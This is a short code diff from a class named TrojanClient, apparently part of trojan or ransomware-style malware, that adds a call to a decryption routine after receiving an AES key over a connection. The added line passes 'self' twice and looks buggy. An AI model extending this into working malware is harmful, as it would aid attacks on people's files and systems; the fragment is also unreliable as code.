@@ -155,7 +155,7 @@ class TrojanClient:
         aes_key = protocol.receive(self.connection)
 
         #decrepption
-
+        self.decryption(self, aes_key)
         
         sys.exit()
         
